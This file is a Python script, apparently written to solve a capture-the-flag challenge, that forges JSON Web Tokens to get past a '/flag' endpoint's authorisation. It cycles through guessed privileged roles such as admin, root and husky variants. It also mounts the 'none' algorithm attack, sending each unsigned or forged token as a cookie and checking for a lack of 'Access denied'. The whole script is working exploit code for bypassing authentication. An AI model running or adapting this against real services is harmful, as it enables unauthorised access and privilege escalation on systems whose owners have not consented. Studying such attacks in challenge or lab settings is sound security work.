import jwt
import requests
import time
from datetime import datetime, timedelta

def create_jwt(username, role, secret_key=''):
    # Current timestamp
    current_time = int(time.time())
    # Set expiration to 24 hours from now
    expiration = current_time + 86400
    
    payload = {
        "username": username,
        "role": role,
        "exp": expiration,
        "iat": current_time
    }
    
    if secret_key:
        token = jwt.encode(payload, secret_key, algorithm='HS256')
    else:
        # If no secret key, try with none algorithm
        token = jwt.encode(payload, None, algorithm='none')
    
    return token

def test_token(token, url):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Cookie': f'jwt={token}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
    }
    
    try:
        response = requests.get(url, headers=headers)
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
        return response
    except Exception as e:
        print(f"Error: {str(e)}")
        return None

def main():
    url = "https://gg5z5bfszbqojno7wae76xr4ze0pyufg.lambda-url.us-east-1.on.aws/flag"
    
    # List of roles to try
    roles = [
        "admin",
        "administrator",
        "root",
        "superuser",
        "super_admin",
        "single_husky",  # Since double_husky is denied
        "triple_husky",
        "husky",
        "master",
        "owner"
    ]
    
    print("Starting JWT brute force...")
    
    # Try different roles with regular JWT
    for role in roles:
        print(f"\nTrying role: {role}")
        token = create_jwt("paws", role)
        print(f"Token: {token}")
        response = test_token(token, url)
        
        if response and "Access denied" not in response.text:
            print(f"Possible success with role: {role}")
            break
        
        time.sleep(1)  # Add delay to avoid rate limiting
    
    # Try JWT none algorithm attack
    print("\nTrying JWT none algorithm attack...")
    try:
        none_token = jwt.encode(
            {"username": "paws", "role": "admin", "exp": int(time.time()) + 86400},
            None,
            algorithm='none'
        )
        print(f"None algorithm token: {none_token}")
        test_token(none_token, url)
    except Exception as e:
        print(f"None algorithm attack failed: {str(e)}")

if __name__ == "__main__":
    main()